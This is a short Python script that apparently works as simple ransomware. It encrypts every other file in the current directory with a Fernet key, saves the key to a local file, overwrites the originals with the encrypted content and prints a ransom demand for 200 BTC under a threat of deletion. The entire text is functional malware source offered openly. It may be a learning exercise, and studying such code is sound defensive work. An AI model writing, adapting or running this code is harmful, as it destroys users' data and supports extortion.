#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "main.py" or file == "test.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

key = Fernet.generate_key()
print(key)

with open("test.key", "wb") as test:
		test.write(key)

for file in files:
	with open(file, "rb") as thefile:
		content = thefile.read()
	encrypt_content = Fernet(key).encrypt(content)

	with open(file, "wb") as thefile:
		thefile.write(encrypt_content)

print("HAHA you got epic pranked!! I have encrypted all of your files so give me 200 BTC or I will delete all of your files.")
